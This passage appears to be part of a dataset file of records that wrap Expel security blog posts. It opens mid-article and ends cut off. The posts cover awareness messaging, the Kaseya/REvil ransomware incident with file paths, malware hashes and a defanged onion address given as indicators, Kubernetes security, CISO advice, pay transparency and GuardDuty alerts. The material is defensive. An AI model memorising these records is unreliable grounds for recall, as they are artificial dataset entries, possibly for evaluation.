generate solid leads that can take us to the endpoint for further validation. Reviewing our original analysis questions, we are now able to confidently answer all 4 questions. Conclusion We often find that network detection is really effective at generating leads by uncovering suspicious activity. Being able to effectively use an investigative platform like Darktrace allows an analyst to quickly confirm and scope potential threat activity and identify network based indicators (NBIs) related to an attack. It can also help generate additional host based indicators (HBIs) to supplement your investigation. In short, effectively using the Darktrace advanced search and other features to discover model attacker activity highlighted in the MITRE ATT&amp;CK framework, is a sure-fire way to enhance your organizations response and hunting capabilities.'}) (input_keys={'title'}),
  Example({'title': "It's time to drive a rising tide", 'url': 'https://expel.com/blog/time-to-drive-rising-tide/', 'date': 'Oct 22, 2019', 'contents': 'Subscribe  EXPEL BLOG Its time to drive a rising tide Tips  10 MIN READ  YANEK KORFF  OCT 22, 2019  TAGS: CISO / Managed detection and response / Managed security / Management Back in 1972, in an effort to help its people deal with rising food prices and promote healthy choices, the National Board of Health and Welfare ( Socialstyrelsen ) in Sweden came up with a model of basic and supplementary foods. This model was refined into a triangle shape to help people visualize proportions a little better by Anna Britt Agnster , whose goal was to improve peoples dietary habits. This design spread gradually across the world hitting Australia in the 1980s and finally, the United States adopted a version of the pyramid in 1992. We know now that the design was pretty terrible , and there have been several revisions since . Nevertheless, it was widely understood and widely adopted. As with most things, the primary driver for this adoption was that it was a simple message, frequently repeated. And while the model has (ahem) shortcomings , it did have some positive impacts including raising awareness about dietary health and getting people to think about portion sizes. You may be wondering how food and cybersecurity are related. (Its not just because I havent yet eaten breakfast.) Were facing the same sort of challenge in cybersecurity today as they were in Sweden back in the 1970s. Whether youre a business or an individual, cybersecurity is some combination of complicated and expensive  both of which will demotivate you to do anything about it. Meanwhile, weve got massive FUD-based marketing campaigns that say little more than, The bad guys are out to get you so youd better spend lots of money! The cybersecurity patchwork we live under Why are we in this state? Because theres widespread disagreement around the cybersecurity fundamentals that help keep us safe. This inconsistent application of basic cybersecurity practices creates a wonderful environment for organized adversaries to accomplish their missions  whether thats stealing financial info or mucking with critical infrastructure. I was on Capitol Hill a few months ago and lost track of the number of times I heard the phrase rising tide in relation to cybersecurity. We dont yet have it. But we need it. Security one percenters (those with proportionally unlimited budgets) can find and retain talent and implement just about anything. Large enterprises can often afford a solid combination of security products and services to build a relatively effective security response strategy. Everyone else? They struggle to build an effective security posture  whether its because of technology, hiring the right people or building the right bridge between the two. The consequences of being in the everyone else boat are clear. Just look at the litany of breach reports hit the headlines only to be swallowed by bigger ones a few months or weeks later. And those are only the ones that get reported. Once in a while youll see a big company name  but more often the problem strikes further down in the mid-market. In fact, as most attackers have discovered at this point that its easier to get to large companies by attacking their less prepared suppliers . Larger enterprises push on their supply chains these days with long lists of high-level security questions as if their compliance will increase the chances of their security. (Spoiler alert: It doesnt.) Theres no shortage of recommendations. CIS security controls? Check. CISA guidance? Sure. Best practices for cloud security? You bet. The NIST CSF will help you work through decisions to improve your security posture. Yet the challenge most organizations face isnt with knowing what to do, its the challenge of getting all those to-dos done. The biggest challenge with cybersecurity? Its not a lack of tech. Or a lack of best practices. Its the business . Were approaching this wrong Weve got cybersecurity frameworks and tech stacks coming out our ears. So why cant we do cybersecurity better? Its because the business cant handle the disruption of turning off macros in excel documents that are downloaded from the Internet. The business isnt willing to deal with the hassle that two-factor authentication introduces into peoples daily lives. A password manager? No way  the business is perfectly happy with sticky notes. Besides, after years of unreasonable password requirements , the business isnt interested in jumping over your newest hurdles. Ive got a secret to share about the business . Like Soylent Green, the business is people! Some faceless business didnt decide it needed to gradually increase its use of Apple mobile devices and laptops in the traditionally Wintel office environment. People did. You and I started using these devices at home and brought them into the workplace, gradually (but significantly) bolstering Apples success in the enterprise space. Cybersecurity needs to vector into the enterprise in the same way. This is where the food pyramid comes in  or something like it. When youre trying to drive a change like this  getting the business to care about security  success demands two things: people need to understand how making a change will help them and those changes need to be easy to remember. We need to encourage (just) four things Im asking people to do four things, in order. The set of recommendations below come in two parts: one way to effectively communicate the recommendation to a broad audience, and the justification for why each is a recommendation in the first place. Remember that the more recommendations we add, the less likely theyll be remembered  and one must do of any cybersecurity framework is to make sure that the guardrails youre coming up with are things that the business will actually do. #1: Update If youre not up to date, youre out of date  or so the saying goes. Or if its not a saying, it should be. Did you know that you can keep your data safe by doing nothing more than keeping your stuff up to date? Turns out that large companies in the headlines can often point to not-updating as the reason why they were breached. Save a lot of heartache and stay up to date. Why update? When I say update, you might think, He surely means patch. But Im not calling it patching. Patching has an innately negative connotation. Its not a fix, its just a temporary patch. While that may be true since were talking about software, if the objective is to motivate action, update encourages the same behavior without the associated baggage. Long-time information security practitioners will be unsurprised to hear that from 2016 to 2017, 60 percent of orgs that suffered a data breach can point to a known vulnerability as the reason for the breach. These vulnerabilities may allow direct access into an enterprise system to an external attacker, or could be paired with a phishing scheme that uses a malicious attachment to exploit a vulnerability local to the users machine. Adobe has the privilege of holding the top four slots (as I write this) on the Top 50 Products By Total Number Of Distinct Vulnerabilities in 2019 . Several Microsoft ones shortly after that. You running any Adobe or Microsoft software in your enterprise? Yeah, I thought so. Over the past several years, there have been arguments crop up from time to time advocating caution against patching  or at least automatic patching. Remember, were not talking about defining the best enterprise patching strategy here. Were trying to build a culture amongst non-security people that they err on the side of turning on automatic updates wherever they go. As computer users, we should want software to be automatically updated. Because once in a blue moon, if something goes wrong, the user pushback becomes overwhelming to deal with. What if we were all on the same side? Lets all be irate if patches break and demand better from vendors. #2: Backup Its heartbreaking to lose precious data. Pictures youve taken over the past several years, old emails youve been keeping around for nostalgias sake, those few letters youve written  these are just as important to you as your yearbooks, old postcards, and other keepsakes in your home. Safeguard your data by using a backup service for your computer. Should your computer go up in smoke, youll always be able to get your files back. Why backups? Ransomwares run rampant through businesses in the past several years, particularly because its been so successful and its substantially cheaper to pay the ransom than it is to hire consultants to fix the problem afterward. This then funds both a higher volume of adversaries and more sophisticated attack methods. Its the gift that keeps on giving  to the bad guys. Turns out one of the simple and effective ways to protect against it is to have a backup of your data. Should you test your backups? Of course. But the first step is actually backing up the data. Some argue that an untested backup is no backup  but it misses a crucial point. Its entirely possible that an untested backup is just fine. You just dont know. Introducing another hurdle before getting people to buy into doing a backup in the first place isnt a good idea. #3: Learn the two step Theres a 1-in-170 chance that one of your social media accounts will be taken over by someone else today if youre using only a password. The odds arent in your favor. Most people spend days apologizing to friends for things they didnt even do (including tricking them into transferring money). Skip the hassle and turn on two-factor or two-step authentication. Why not multi-factor authentication? No, two-factor authentication and two-step authentication are not the same thing . Yes, Im equally aware that SMS-based methods are substantially less secure than their app-centric counterparts. The point is to start small. Let them discover the flaws after accepting the notion of two things and go from there. But even adopting two-step authentication over SMS is a stronger stance than using only a password. Its important to drive home the message of safety here. Unintended accidents happen. Send a herd immunity message. Despite evidence to the contrary , it works. #4: Forget your passwords Save time logging in anywhere by skipping the username and password prompt. Install a password manager. Itll generate passwords for you, log you in with one click, and keep your account much safer. When your favorite website tells you they lost your password to hackers, you can change just one password instead of a dozen because password managers help you use a unique password on every website (that you dont even have to memorize). Why password managers? I wont list all the problems with passwords, but there are many. Multi-factor authentication goes a long way to improving the situation here, as do alternative methods for authentication like biometrics. Recovering from a compromised account is bad enough, but dealing with constantly changing passwords for sites whose accounts have been compromised en masse is a pain. Considering that most people reuse passwords, this threat surface is huge. Beyond the security reasons for using a password manager, though, is the fact that it actually makes it easier to deal with all your accounts. Most password managers act like bookmarks and will log you into sites automatically with one click. That said, it can be a huge mental shift for people. So what will it take to be convincing? Keep reading. Stick to some messaging themes Maybe you buy the arguments above, maybe you dont. Regardless, Id like to offer some thinking around why these recommendations are expressed in this way. The TL;DR: Its all about making your employees feel that these (few) recommendations are easy for them to remember and follow. Because then theyll be more likely to put them into practice. Make it personal When youre selling these ideas, its critical to make it clear that were talking about your apps (software), your stuff (data) and yourself (your identity, time, and money). Making this personal creates a stronger connection with the recommendations. You know how Apple creates a connection when you walk into a store? They intentionally angle the screens of their laptops so the first thing you do is adjust it  you touch the machine. When its about you, youre more likely to take action. Safety over security The pedantic will argue that security is the right word to use here. But Ive had enough conversations with people who say, that would never happen to me, that tells me safety is the better word. In case youre not caught up on the difference, general consensus appears to be that safety is about protecting against unintended threats, while security is about protecting against intentional ones. While most people dont believe in intentional threats, theyre willing to make accommodations for unintentional ones to avoid becoming collateral damage. No buzzwords Instead of telling people to use multi-factor authentication or install a password manager, introduce a catchy phrase that says what to do and how youll benefit  in everyday language. Some symmetry Notice the two recommendations pair. The first two, updates and backups, speak to keeping your data safe. In the former case, youre protecting your data by making it hard for people to break into your apps. In the latter case youre protecting your data by making a copy of it. The second two recommendations are about keeping people away from your stuff with effective (and in the latter case, time-saving) authentication. No red Ill grant you that working at Expel gives me a particular predisposition to green. Still, we have enough red, grey and black in the security space and what people need is a path towards a safer tomorrow versus campaigns full of FUD with photos of attackers wearing hoodies. This reminds me of parenting toddlers : dont tell them what not to do, tell them wha t to do instead. Whats next? Remember our premise: the business is people and you need to drive change in peoples behavior. Frankly, most people dont care much about the overall security of the company in which they work. You might  if youre on the security team. Everyone else, though, has a job to do and they care much more about that than the security implications of sending an email or hosting a Zoom meeting. Or worse: They think security might get in the way of getting their stuff done. If you really want to drive better security awareness, forget the business. Promote individual security. Promote basic behaviors that people can start doing at home and then they can bring those same practices into the office. Convince people to care about their own email and social media accounts. Help people understand the costs and hassles associated with identity theft or simple loss of data, and provide the tools for them to secure their personal lives. At scale, theyll bring this mindset back into the office and together will drive a rising tide. Having a message is the first step, and weve talked a lot about what that might look like. Simplifying it is step two  and Im not convinced were there yet  but perhaps you can take the messages above and move in that direction. Once youre there, the third step is repeating it frequently enough and in sufficiently unique ways that the message resonates. The marketing rule of 7 , if you will. Its cybersecurity awareness month this month and its a great time to roll out this sort of campaign in your org. Will you join us and help drive a rising tide?'}) (input_keys={'title'}),
  Example({'title': 'Kaseya supply chain attack: What you need to know', 'url': 'https://expel.com/blog/kaseya-supply-chain-attack-what-you-need-to-know/', 'date': 'Jul 6, 2021', 'contents': 'Subscribe  EXPEL BLOG Kaseya supply chain attack: What you need to know Security operations  3 MIN READ  BEN BRIGIDA, MATTHEW BERNINGER, JON HENCINSKI, EVAN REICHARD AND RAY PUGH  JUL 6, 2021  TAGS: Alert / MDR It was a few hours before the start of a holiday weekend, and attackers decided to strike. What type of attack? You guessed it  ransomware. Theres been a steep rise in supply chain ransomware attacks like this one since 2017, and we have no doubt that well continue to see these types of attacks. Unlike the smaller payout bad actors may earn using cheap tactics, a sophisticated attack like this latest REvil ransomware attack can mean big money. So constantly evolving their tactics is an investment attackers are willing to make. But heres your reminder to not panic. The community rallied quickly, creating awareness and providing guidance on how to guard against this attack. And well continue to do so in the face of events like this. What happened Kaseya, an IT solutions company used by many Managed Security Providers (MSPs) and enterprise orgs, announced on July 2, 2021 that it was the victim of a large-scale supply chain attack. Kaseya VSA, a remote monitoring and management (RMM) tool, was exploited via a zero-day vulnerability (CVE-202130116) to deploy ransomware to MSPs and at least hundreds of US businesses. The ransomware was deployed through an automated malicious Kaseya VSA software update. The ransomware threat group REvil, also known as Sodinokibi, claimed responsibility . The Kaseya SaaS VSA servers were shut down and the company recommended that all local VSA servers be shut down immediately. Kaseyas team worked quickly and believes the attack is localized to a few on-prem customers. On July 4, 2021, Kaseya announced that all VSA SaaS servers will remain in maintenance mode. Below is a recap of what we know so far. Technical details REvil ransomware encryptor is dropped at c:kworkingagent.exe Further files are dropped in c:windows: MsMpEng.exe (legitimate Microsoft Defender copy) mpsvc.dll (Malicious REvil DLL) The malicious mpsvc.dll is side-loaded into the legitimate Microsoft Defender copy (MsMpEng.exe) Indicators and warnings c:kworkingagent.exe c:kworkingagent.crt 45aebd60e3c4ed8d3285907f5bf6c71b3b60a9bcb7c34e246c20410cf678fc0c (agent.crt) d55f983c994caa160ec63a59f6b4250fe67fb3e8c43a388aec60a4a6978e9f1e (agent.exe) 8dd620d9aeb35960bb766458c8890ede987c33d239cf730f93fe49d90ae759dd (mpsvc.dll) e2a24ab94f865caeacdf2c3ad015f31f23008ac6db8312c2cbfb32e4a5466ea2 (mpsvc.dll) hxxp://aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd[.]onion What you can do right now to keep your org safe First and foremost  dont click on any links! Kaseya warned that links sent by the attackers may be weaponized. Theyve also shared a new Compromise Detection Tool to help determine if there are indicators of compromise on a VSA served or managed endpoint. There are also a few steps you can take right now to protect against this attack. If you havent already done so, we recommend you immediately: Shutdown VSA server Disable / Uninstall Agent Block all known malicious hashes: d55f983c994caa160ec63a59f6b4250fe67fb3e8c43a388aec60a4a6978e9f1e (agent.exe) 8dd620d9aeb35960bb766458c8890ede987c33d239cf730f93fe49d90ae759dd (mpsvc.dll) e2a24ab94f865caeacdf2c3ad015f31f23008ac6db8312c2cbfb32e4a5466ea2 (mpsvc.dll) Lastly, make sure you incorporate these learnings into your detection strategy. After notifying our customers of the situation, Expel deployed be on the lookout detections  where customers are immediately notified of a detection  for the two known malicious hashes, and for the known file paths the attackers have been reportedly using. Expel has also begun pushing out more generalized logic rules to catch variants of these attack vectors. What you should keep in mind We get it. Saying dont panic is easier said than done. Constant news of emerging threats can be nerve-wracking and downright frustrating. But its important to remember that in the minutes and hours after an announcement like this, certain things are key: communication, action and integration. Communicating with our customers and notifying them of new threats is critical. Not only do they need to know that youre on it, but this also gives them the chance to take their own actions. So, whether its with customers or your internal teams, make sure everyone is in the loop. Time is of the essence. Depending on the situation, taking action could mean deploying new signatures, implementing a new hunting strategy, responding to active attackers or  if youve evaluated the information and theres really nothing to do  sometimes nothing. And during an attack outbreak like this, burnout can happen quickly. The mental strain of being in constant emergency mode will only exacerbate burnout and lead to alert and response fatigue. Remember that resiliency also includes keeping your team safe from burnout . While, fortunately, Expels customers were not impacted, this serves as a great reminder that during any incident, its important to understand what completion looks like. As we respond to urgent incidents like this, were also working to integrate whatever actions we took or are taking back into our usual operational cadence here at Expel. Finally, be sure to stay informed on the developments of this newest ransomware attack by regularly checking Kaseyas updates .'}) (input_keys={'title'}),
  Example({'title': 'Kubernetes security: what to look for', 'url': 'https://expel.com/blog/kubernetes-security-what-to-look-for/', 'date': 'Mar 1, 2023', 'contents': 'Subscribe  EXPEL BLOG Kubernetes security: what to look for Security operations  3 MIN READ  DAN WHALEN  MAR 1, 2023  TAGS: MDR When it comes to Kubernetes (k8s), there are three kinds of organizations: Orgs that need security (preferably sooner vs. later) Orgs that built their own security Orgs that started building their own and decided there has to be a better way We imagine there are a lot of #2s that are very close to becoming #3s. Regardless, if your operation does its own application development, k8s is likely part of your future (or present). The problem is that, like any new tech, k8s has its share of security gaps, and failure to address them could lead tosuboptimal outcomes. So, if youre one of these organizations, what should you look for when building or shopping for a Kubernetes security platform? Here are a few suggestions. Kubernetes security should be integrated. There are many, many platforms, technologies, and solutions (cloud, network, endpoint, and more) in the modern security operations center (SOC), and each one represents an opportunity for the cyber defenders of the world. The ideal answer to your challenges integrates k8s development and security with as many of these disparate systems as possible, affording you a clean, unified view of your environment and the entire attack surface. This is especially important for Kubernetes, where much of the context youll need for detection and response exists in other tech. Kubernetes security should be customizable. Technical requirements change. Business requirements change. New platforms are onboarded. Leadership decides to embark on new initiatives. If all goes well, the organization grows . It often seems like the SOC isnt the same as it was five minutes ago. If you arent set up for it, change (like expanding k8s operations) can represent chaos (and chaos equals risk). As your k8s operations expand, youll need a security environment that scalesquickly and seamlessly. When this happens, security accelerates the business instead of hindering it, turning the boards periodic cost conversations into ROI conversations. Kubernetes security should be automated, fast, and accurate. Threats come at you fast. Which is why theres no substitute for intelligent automation in any SOC, especially one serving an organization thats relying more heavily on emerging technologies. K8s is especially prone to exploitable configuration errors, with more than half of organizations using Kubernetes detecting a misconfiguration in the past year . Your SOC needs to be able to analyze k8s clusters and create detections (in alignment with the MITRE ATT&amp;CK framework ), providing you with insights you can put into play 24/7. Kubernetes security should be accessible. Security has a bit of a bad rap for being complex and obscure (something weve tried hard to rally against). Kubernetes is already a highly specialized area of expertiseif youre looking for k8s security expertsgood luck. Security solutions should help bridge this gap. We love Kubernetes wizards (what would we do without you?) but the truth is we cant expect everyone to be oneespecially as we think about folks on the front lines in a SOC. The ideal solution allows your people (technical and not) to succeed without requiring expert-level K8s chops. Kubernetes security should be transparent and trusted. This shouldnt need saying, but lets say it anyway. As k8s grows, well see more and more solutions aimed at safeguarding it. Not all of them are going to be ready for prime time, so question 1 has to be: Do I trust this provider with my business? Question 1a: If so, why? In our view, transparency goes a long way towards building trustthese days most security folks avoid black box solutions. Youll be tempted to try open-source tooling (there are many great projects to choose from) but dont equate open source with free. Choosing the right solution will depend on your specific requirements and what you want to take on versus hire out. This list doesnt cover everything you need to address , but once youve satisfied these four criteria, youll be well down the road toward securing a genuinely transformative new development technology for your business. If you have questions or just want to talk through things, drop us a line .'}) (input_keys={'title'}),
  Example({'title': "Lessons learned from a CISO's first 100 days", 'url': 'https://expel.com/blog/lessons-learned-from-a-cisos-first-100-days/', 'date': 'Jul 11, 2018', 'contents': 'Subscribe  EXPEL BLOG Lessons learned from a CISOs first 100 days Security operations  7 MIN READ  AMANDA FENNELL  JUL 11, 2018  TAGS: Career / CISO / How to In this guest post, Amanda Fennell, CSO at Relativity reflects on what shes learned. I recently finished my first 100 days as Chief Security Officer (CSO) of Relativity. Ive learned a lot. And while every new CSO faces unique challenges based on their organizations mission and circumstances, with the benefit of hindsight (and a little time to breathe), Ive come up with some recommendations to help new CSOs navigate their first few months. Understanding the unique context of an organization is the first component of building a world-class security program. Our company, Relativity , is an e-discovery firm and creator of the industry-leading e-discovery platform used by over 170,000 users in 40+ countries. Our clients represent the highest tiers of government, public and private industry entities, including the Department of Justice, Deloitte and NBC Universal. Relativitys cloud solution, RelativityOne , offers all the functionality of Relativity in a secure and comprehensive SaaS product. Our clients trust our tools to discover the truth within the massive amount of documents they review and manage during investigations, litigation and lawsuits. When handling billions of highly sensitive documents, security is of utmost importance to build and maintain confidence with our valued users. Understanding the significance of security to Relativity was pivotal when I stepped into the role. Now that Ive spent the past 100+ days working to gain a better understanding of how we do what we do, I also know how to make the security team a critical part of the organization. And that leads me to my biggest takeaway. The most important thing a new CSO (or any leader) can do in their first few months is to create a compelling vision and communicate it effectively. With that, I have distilled my experience on reaching that outcome. 1. If you can, take your time Relativity moves fast  thats our culture. But if I had the chance to start this process again, Id give myself more time. The design and implementation of a security roadmap must have defined milestones, but exist as a living document to align with the inherent impermanence of the field. If you can, dedicate a defined period  ideally 30 to 90 days  to assess the current state and understand the interdependencies of the various teams in your organization. Even if youve got the techiest of CIOs (and we do), and you immediately click, youre going to be responsible for security throughout your organization, and it takes observation and experience to understand how each team derives value from security. Understand that they have their own objectives, and roadmaps, and theyre having to add you in late to the game. These first few months I was in a state of assessment and now we are moving to a state of measuring movements, growth and execution on our objectives. We have a strong team and we worked hard to assess key risks and adopt the mindset of an adversary working to breach Relativity and our clients. We completed our gap analysis with this in mind and addressed any perceived weaknesses. But I also spent my first days as CSO considering the role of security in the overall business and learning from a series of nearly 50 one-on-ones with directors and VPs to find out what matters most to folks across the company and how I could work effectively with each key stakeholder. Something as simple as a survey can help establish a more complete sense of your new organization and provides a baseline reference for measuring the success of the program. Shortly after taking on this new challenge, we sent out a survey to get more information on what people thought worked, and what needed addressing. A few months later, we did a follow-up to measure success. That gave us a sense of how our internal customers viewed our security team, and it was very helpful in helping me identify initial priorities and course-corrections to seize early wins. Once youve gained an understanding of your organizations challenges, you can begin creating a vision for security and refine it across your organization. 2. Aligning Security with the Business I may not have had my final roadmap by day three, but I had started my research. I realized early-on that I wasnt going to get anywhere without budget and resources  and the best way to get those was by connecting security to revenue. Since security is a key concern for our clients at Relativity, that meant connecting with our sales department. This gave us a direct route to treat security as a product that is constantly evolving, transparently reported and consumable by our end-users. To empower our clients to trust and understand how we secure their data, we needed our marketing and sales teams to offer insight and expertise on what we do, and why we do it. I started meeting regularly with our marketing team to make sure they understood what were doing  and so I understood how they work. I talked with them about my vision of integrating security and sales, and I got crucial buy-in to establish this partnership. Im fortunate in my role. Ive got a CEO who is extremely technical, committed to security and willing to put the time and resources into implementing the best possible solution for our clients. I inherited a top-notch product security team. But a CEO is just one person, and a company is more than security, sales and marketing. The next objective was to sell my vision of security integration across the company. From the insight gained from those initial meetings with our stakeholders, I understood the motivations and drivers for directors and VPs across the organization. I also seized the opportunity to polish my strategy and developed ways to pivot into company-wide contributions. Relativity has spent considerable effort recruiting the best minds in our industry, and they were quick to challenge my assumptions and objectives to gain a sense of my approach. Confidence in my strategy, along with passion for our mission, helped me make a convincing case. The connection between security and the business may not be as direct in your organization as it is at Relativity. But I guarantee theres a connection to a department outside of your own. Youre assuredly not in a vacuum and you exist to secure your company. You fundamentally provide a service and how do you know how youre doing? How do we get things accomplished? By being part of a team. Having stakeholder meetings, SLAs and KPIs. If it seems elusive, use your one-on-ones in the first 60 days to connect the dots and push yourself to find the direct connection and identify the business questions youll need to answer effectively. 3. Create ambassadors Once I had my vision, my strategy was relatively simple: because security is a top consideration for any company considering Relativity, the team members on our front line need to be confident when speaking to complex security topics. I made a business goal to work with our sales team to help them truly understand how we keep data secure. Were starting to host real, in-depth technical training sessions  not just, hey, read this deck and watch this video, but actual lessons on how the customers data is protected, how encryption works and what monitoring with our cloud security team actually looks like. By integrating with our sales and marketing team, we enable and empower them to do their jobs even better than before. Nobody has to call the security team to ask, Hey, which datacenters have we got located where? They can provide a comprehensive, accurate and appropriate answer in real-time. We now have a sales team that works as an extension of our security team. If your road to connecting security to revenue doesnt go through the sales or marketing organization itself, the same principle applies. Figure out who cares about security (and who ought to). Then, get personally involved in making sure they understand your vision and can educate the team or client that needs to know. Another great example is IT. Our IT department has provided a great deal of support to prioritize security initiatives and make our vision tangible. Why? Because they care about security. Youll find solid partners in IT and engineering teams  smart, savvy and a healthy dose of paranoia about securing things. Thats a great start to a partnership! 4. Pick concrete collaborators you can trust Several core values here at Relativity create a spirit of transparency. Were feedback driven. We want our people involved in the process of developing our business, which means we want everyone on the same page. Thats true across teams, as well as with our third-party partner relationships. Weve selected a great set of vendors we collaborate with including Palo Alto Networks, Recorded Future, RedLock and Splunk. We made these decisions after careful review and analysis about what would be the best fit for our company, product and teams. We also wanted someone who used those products across multiple environments and industries  to give us a more diverse perspective. So we began to seek options for managed security providers. As we weighed our options, we evaluated the capabilities and strategic direction of well-known vendors and newer players. We ultimately selected Expel because of their passion and approach  particularly their transparency  was so aligned with our own principles. And we werent disappointed. From deeply technical team calls to midnight consults via Slack, theyve got as much passion as we do, and we really understand each other. This produced an organic and collaborative solution to one of the most important functions of our work: ensuring that we keep our customers data secure. 5. Invest where it counts  in people If youve built a compelling vision, aligned security with the business, and communicated broadly, this one should be a cinch. But beware, when it comes to building your team, everyone will want to talk to you about HR banding and competitive pricing. But my advice on this one is simple: pay for talent. Period. You absolutely must have talented employees to build the best possible team. As much as I love and appreciate technology, I know that no tool will ever replace an amazing, talented rock star on your team. And when you can build a team of rock stars  theres nothing better. So, there you go. Those are my five key takeaways. I guarantee  even if this is your third or fourth rodeo in the CSO saddle  the first hundred days will be overwhelming, exhausting and exhilarating. But if you give yourself a little breathing room at the start and invest some time in doing your homework, youll get what you need to develop and sell your vision for success. Relativity has a lot of great information about how they approach security on their website.'}) (input_keys={'title'}),
  Example({'title': "Let's talk compensation: Why Expel made the move to pay ...", 'url': 'https://expel.com/blog/why-expel-made-the-move-to-pay-transparency/', 'date': 'Apr 19, 2022', 'contents': 'Subscribe  EXPEL BLOG Lets talk compensation: Why Expel made the move to pay transparency Talent  3 MIN READ  JEFF KAISER  APR 19, 2022  TAGS: Careers If you know Expel, you know transparency is our middle name. In fact, its one of our core values. Which should mean its not surprising that weve recently embraced pay transparency at Expel. We believe that our people (current and prospective) should always feel comfortable asking about an employers pay practices but, for many, that doesnt make the conversation any less daunting. We hope that practicing pay transparency (and spreading the word) will make this conversation easier  not just for our people, but for anyone looking to have an honest dialogue about compensation with their employer. In this post, well walk you through what this means to us at Expel, how we arrived at the decision, and what weve learned along the way. Pay transparency is here to stay and thats a good thing Pay transparency is a hot topic. Some big companies like Whole Foods and Netflix were early adopters of this approach. Now, new legislation rolling out across the U.S. requires companies to release details about pay when hiring. On top of that, the Great Reshuffle has empowered people to ask employers for what they want  which includes fair pay. As the push for equity at work picks up speed, LinkedIns #BigIdeas2022 predicts that 2022 is the year that pay transparency goes mainstream. We think thats the way it should be. So what is pay transparency? Pay transparency refers to the level of detail a company communicates about its pay practices. This typically happens on a scale, starting with providing basic salary info to the individual, all the way to sharing all of the details around how and why pay decisions are made. What does that scale look like at Expel? In short, we share salary ranges for job roles internally and externally, and have straightforward conversations with our people about their pay. That means: All Expletives (thats what we call our people) can see Expel salary ranges using our Compensation Lookup Tool. (A note that the salary ranges included in our tool are for roles; we do not disclose individual salaries.) Managers use the Compensation Lookup Tool as a reference when hiring. Equity, bonus, and commission targets are also included. All Expel job ads and descriptions include the salary min and max. Recruiters talk openly about our salary ranges to candidates. How did we get here? Over the past year, weve been on a journey to analyze compensation, clarify decision criteria, and adjust our processes to make sure were offering competitive, consistent, and equitable pay. Theres no one-size-fits-all approach for going pay transparent. Each company has to conduct the studies and make the necessary investments to be confident in their pay practices, systems, and data. For us, this meant first conducting a salary equity analysis with an outside vendor that found no statistically significant bias in the way we pay at Expel. We then validated and adjusted our salary ranges by role to align with the market. It also involved reviews of the compensation of every Expletive to confirm consistency across roles, levels, and teams. Plus, we monitor these baselines continuously and conduct in-depth analyses annually (at least). Most importantly, weve recognized that pay transparency is a work-in-progress. We use trusted data to track our salary ranges against the market, but we also listen to what our people, recruiters, and candidates have to say. Expletives are encouraged to ask questions and bring up their concerns around how we determine pay. We rely on our people to share new data, fresh ideas, and industry knowledge to help us navigate through the ever-changing compensation landscape. As part of that, we give Expletives resources to better understand our pay practices, and compensation education is part of everyones professional development. For example: Live trainings and recordings are available to provide education on our compensation philosophy and strategy. We talk about job leveling, market positioning, and how we determine someones position in their salary range. Our Compensation Lookup Tool gives all Expletives job info for all of the roles in the company, as well as salary ranges, bonus and equity information, and how we match the roles to the market.  And why? Part of our mission at Expel is to create space for people to do what they love, and that applies to our compensation philosophy, too. Pay transparency is a natural expression of Expel values: We take care of our people. We want everyone to have confidence in our consistent practices and equitable salaries, so they can go do what they love without that worry. We value transparency. Having clear decision criteria and helping Expletives understand how pay decisions are made opens communication and builds trust. Pay transparency improves inclusion and diversity. By communicating our salary ranges internally and externally, we are taking a solid step to disrupting systemic inequity. What weve learned Pay transparency is about being transparent in more ways than one. Its about more than analyses and updated salary ranges on job ads. You have to walk the walk and communicate the results to your people. Explain your compensation philosophy clearly, and give context and criteria for your pay decisions. After a year of work, were proud of how far weve come, and weve made sure to bring Expletives along on every step of the journey. This honest and open approach to compensation isnt just what we believe in, its the right thing to do. Questions about our move toward pay transparency, or anything else that makes Expel, Expel? Reach out any time .'}) (input_keys={'title'}),
  Example({'title': 'Making sense of Amazon GuardDuty alerts', 'url': 'https://expel.com/blog/making-sense-amazon-guardduty-alerts/', 'date': 'Oct 15, 2019', 'contents': 'Subscribe  EXPEL BLOG Making sense of Amazon GuardDuty alerts Security operations  5 MIN READ  ANTHONY RANDAZZO  OCT 15, 2019  TAGS: Cloud security / Get technical / How to / Managed security / SOC Gone are the days when we only had to protect some physical servers and all of the associated networking gear used to route traffic to and from those servers in our data centers. Fast forward to today  most companies are running at least some of their workloads in the cloud. Today weve got virtualized servers, abstracted services and a simplified networking layer all managed via an API. Amazon Web Services (AWS) offers lots of security services to help protect their customers data. One of the more well-known services for detection and response is Amazon GuardDuty . If youve heard of Amazon GuardDuty but arent exactly sure how to get the most out of it, then this post is for you. Ill talk about how Amazon GuardDuty works, share the kinds of threats its looking for, show you some sample alert investigations and offer a couple tips for how to make more sense of the signals you get from GuardDuty. What is GuardDuty in AWS? Amazon GuardDuty is a continuous threat monitoring service available to AWS customers that works by consuming CloudTrail logs (AWS native API logging), Virtual Private Cloud (VPC) flow logs and DNS logs. Fortunately, CloudTrail logging is enabled by default  and you dont even have to pay for VPC flow logs or Amazon Route 53 (AWS DNS) to benefit from GuardDuty as long as youre using an AWS DNS resolver (versus using something like Google or OpenDNS). However, having VPC flow logs enabled will provide defenders another tool in their toolbox to use when investigating potential security incidents (more on this later). Now, if you consider what visibility AWS has into its customers data and services , then GuardDutys use of these three datasets make sense. Now lets look at what types of alerts GuardDuty might generate for us by using flow, DNS and API activity logs. As of today, there are 54 unique GuardDuty findings (more commonly known as rules). These are all based on easy to understand logic or basic anomaly detection. Each finding has the following naming convention: ThreatPurpose:ResourceTypeAffected/ThreatFamilyName.ThreatFamilyVariant!Artifact Well focus on the ResourceTypeAffected portion of that convention because this is the most important section to understand when youre reviewing GuardDuty alerts. Today, this field will consist of either IAMUser or EC2. All Elastic Cloud Compute (EC2) rules are based on VPC flow logs or DNS logs, while the IAMUser rules generate alerts from CloudTrail API logs and possibly in conjunction with flow and DNS logs. Weve found the IAMUser rules to be quite valuable, as they indicate authenticated access into your AWS account. Because of AWS visibility into our data, many of the EC2 rules are based on an AWS-curated threat lists of atomic IOCs such as domains and IPs. These are then filtered against the flow and DNS logs. But theres a problem: just like with most security tech, we dont have any visibility into the threat lists that AWS is using and how they match up (or dont match up) with the threats were concerned with for our own org. However, theres a silver lining here: Youre able to provide your own threat lists from third parties and even automate the ingestion of these lists into GuardDuty. This can be IOCs youve identified internally to your org or external feeds you subscribe to or consume through something like a Threat Intelligence Platform . When considering the pyramid of pain  a model focusing on how best to disrupt attackers  many of these GuardDuty alerts correspond to the bottom of the pyramid. When consuming lower fidelity alerts, we recommend enriching those with additional context to provide analysts with more decision support. Here at Expel we take advantage of some third-party enrichment services, such as passive DNS, WHOIS information, OSINT and other data to get a better understanding of the potential threats associated with these IPs and domains 